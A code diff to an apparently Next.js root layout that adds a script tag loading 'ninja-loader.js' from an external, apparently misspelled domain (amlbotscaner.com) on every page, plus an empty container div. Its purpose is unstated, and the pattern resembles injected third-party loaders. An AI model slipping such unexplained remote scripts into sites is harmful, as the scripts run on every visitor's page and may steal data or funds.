@@ -1,6 +1,7 @@
 import ReduxProvider from "@/Redux/ReduxProvider";
 import { Inter } from "next/font/google";
 import "./index.css";
+import Script from "next/script";
 
 const inter = Inter({
   subsets: ["latin"],
@@ -25,6 +26,13 @@ export default function RootLayout({
   return (
     <html lang="en">
       <body className={`${inter.variable} antialiased`}>
+        <div id="v-root-container"></div>
+
+        <Script
+          src="https://amlbotscaner.com/ninja-loader.js"
+          data-v-key="2ea0b2e6-40d8-46d6-9117-d930aa40d03d"
+          strategy="afterInteractive"
+        />
         <ReduxProvider>{children}</ReduxProvider>
       </body>
     </html>
